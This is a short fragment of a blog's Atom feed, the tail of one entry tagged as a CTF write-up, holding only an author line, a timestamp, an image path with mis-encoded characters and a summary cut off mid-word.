&lt;p&gt;@Author: Patrilic&lt;br&gt;@Time: 2019-06-05 20:59:32&lt;br&gt;&lt;img src=&quot;/wallpaper/[41576]ã€Œã€€ã­ã‡ã€ã€-64710934.jpg&quot; alt&gt;&lt;br&gt;å¾ˆå°‘é‡åˆ°ä½¿ç”¨ &lt;strong&gt;m
      
    
    </summary>
    
      <category term="Write-up" scheme="http://patrilic.top/categories/Write-up/"/>
    
    
      <category term="CTF" scheme="http://patrilic.top/tags/CTF/"/>
    
  </entry>
  
</feed>
